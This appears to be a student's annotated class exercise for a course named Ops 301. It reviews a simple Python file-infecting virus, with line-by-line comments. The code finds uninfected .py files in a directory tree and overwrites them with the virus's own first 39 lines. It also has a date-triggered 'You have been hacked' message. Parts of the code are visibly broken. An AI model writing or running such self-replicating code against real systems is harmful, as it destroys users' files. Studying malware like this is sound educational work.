# Script Name:03-code.sh                
# Class Name:Ops 301
# Author Name:Anthony Wall
# Date of latest revision:03/30/2023
# Reviewing a viral script

#!/usr/bin/python3
# this is calling the OS to interact with it 
import os
# calling the date/time modual to possible be interacted with 
import datetime
# setting a constant variable SIGNATURE to the value "VIRUS".
SIGNATURE = "VIRUS"
# this line deinfs a function named locate that takes a path agument
def locate(path):
# this line is initalizing a emoty list named "files targeted"
    files_targeted = []
# this line is a function to get a list of all files in the directory specified by path 
    filelist = os.listdir(path)
# this is starting a loop that iterates over each file name in file list      
    for fname in filelist:
# this is checking if the cuttent file name is a directory         
        if os.path.isdir(path+"/"+fname):
# this is calls the locate function in the subdirectory 
            files_targeted.extend(locate(path+"/"+fname))
# this line is checking to if the file name ends with py 
        elif fname[-3:] == ".py":
# this line sets the boolean varianle "infected" to false         
            infected = False
#  This line opens the file and starts a loop that iterates over each line in the file.
            for line in open(path+"/"+fname):
# This line is checking if the current line contains the virus "signature"               
                if SIGNATURE in line:
# This line sets the infected variable to True if the virus "signature" is found in the file.                     
                    infected = True
# This line stops the loop if the viruse "signature" is found in the file.
                    break
# This line is checking if the infected variable is still False.
            if infected == False:
# This line appends the current file path to the "files_targeted" list if the file is not infected.
                files_targeted.append(path+"/"+fname)
# this line is returning the "files_targets" list.                  
    return files_targeted
# this line is deing a function named "infect" that takes a "files_targeted" argument
def infect(files_targeted):
# this line opens the current file.  
    virus = open(os.path.abspath(__file__))
# this is creating a string with "virusstring" hidden in it.  
    virusstring = ""
# this is staring a loop that interates over each line in the file using the enumerate "()" function to get both line numbers and contents. 
    for i,line in enumerate(virus):
# this is chekcing if the line number is between 0 and 39
        if 0 <= i < 39:
# this line is appending the current line to the sirusstring
            virusstring += line
# this is closing the virus 
    virus.close
# this line starts a loop that iterates over each file path in "files_targeted"
    for fname in files_targeted:
# this is opening the current file. 
        f = open(fname)
# 
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()